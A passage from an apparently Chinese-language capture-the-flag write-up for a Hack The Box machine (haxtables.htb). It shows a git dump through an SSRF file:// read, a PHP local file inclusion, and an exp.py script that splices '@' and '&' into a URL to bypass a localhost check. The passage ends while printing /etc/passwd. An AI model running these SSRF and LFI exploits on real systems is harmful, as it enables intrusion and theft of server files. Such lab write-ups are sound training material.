class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_status</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;z</span><br><span class="line">    <span class="variable">$status</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /usr/bin/git status&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_log</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = shell_exec(<span class="string">&#x27;cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;&#x27;</span> . addslashes(<span class="variable">$file</span>) . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$log</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$commit</span> = shell_exec(<span class="string">&#x27;sudo -u svc /var/www/image/scripts/git-commit.sh&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$commit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该路径疑似存在git</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/.git/HEAD</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ref: refs&#x2F;heads&#x2F;master</span><br></pre></td></tr></table></figure>
+<p>确认存在git</p>
+<p>获取<code>GitTools</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/internetwache/GitTools</span><br></pre></td></tr></table></figure>
+<p><code>./GitTools/Dumper/gitdumper.sh</code>的curl语句替换为如下语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://api.haxtables.htb/v3/tools/string/index.php&quot;</span> --json <span class="string">&quot;&#123;\&quot;action\&quot;:\&quot;b64encode\&quot;, \&quot;file_url\&quot;:\&quot;file:///var/www/image/.git/<span class="variable">$objname</span>\&quot;&#125;&quot;</span> | jq -r .data  | base64 -d &gt; <span class="string">&quot;<span class="variable">$target</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>获取项目文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash ./Dumper/gitdumper.sh http://images.haxtables.htb/.git/ /tmp/image/</span><br><span class="line">bash ./Extractor/extractor.sh /tmp/image/ /tmp/dump/</span><br></pre></td></tr></table></figure>
+<p>得到<code>/action/action_header.php</code>内容</p>
+<p>确认内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/actions/action_handler.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;No page specified!&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>存在可以进行LFI漏洞，请求<code>http://image.haxtables.htb/actions/action_handler.php?page=PAYLOAD</code>进行LFI_TO_RCE</p>
+<p>确认<code>/etc/hosts</code>信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /etc/hosts</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 encoding</span><br><span class="line">127.0.0.1 haxtables.htb api.haxtables.htb image.haxtables.htb</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>
+<p>存在<code>image.haxtables.htb</code>的解析记录</p>
+<p>编写<code>exp.py</code>如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://image.haxtables.htb/actions/action_handler.php?page=%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+<p>进行LFI测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py file:///etc/passwd</span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;Unacceptable URL&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>查看<code>api.haxtables.htb/v3/tools/string/index.php</code>的代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/v3/tools/string/index.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../../../utils.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="string">&#x27;file_url&#x27;</span>, <span class="variable">$jsondata</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = get_url_content(<span class="variable">$jsondata</span>[<span class="string">&#x27;file_url&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span>  === <span class="string">&#x27;str2hex&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; str2hex(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>  (<span class="variable">$action</span> === <span class="string">&#x27;hex2str&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span> =&gt; hex2str(<span class="variable">$data</span>) ]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;md5&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; md5(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;sha1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; sha1(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urlencode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urlencode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urldecode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urldecode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64encode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_encode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64decode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_decode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span>=&gt; <span class="string">&#x27;Invalid action&#x27;</span>], <span class="number">404</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>查看第一个<code>api.haxtables.htb/handler.php</code>的代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/handler.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_included_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">return</span> ob_get_clean();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; file_get_contents(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, json_encode(<span class="variable">$post</span>));</span><br><span class="line">    curl_setopt( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>函数<code>get_url_content</code>禁止对127.0.0.1进行访问</p>
+<p>页面调用功能时请求为<code>haxtables.htb/handler.php</code><br />
+查看其代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/html/handler.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../api/utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;uri_path&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        <span class="comment">// echo jsonify([&#x27;message&#x27; =&gt; file_get_contents(&#x27;php://input&#x27;)]);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = make_api_call(<span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>函数<code>make_api_call</code>无限制</p>
+<p>但存在URL拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>前面的内容用<code>@</code>注释<br />
+后面的内容用<code>&amp;</code>注释</p>
+<p>修改<code>exp.py</code>如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri_path&#x27;</span> : <span class="string">&#x27;@image.haxtables.htb/actions/action_handler.php?page=%s&amp;&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://haxtables.htb/handler.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+<p>再次尝试LFI</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py /etc/passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 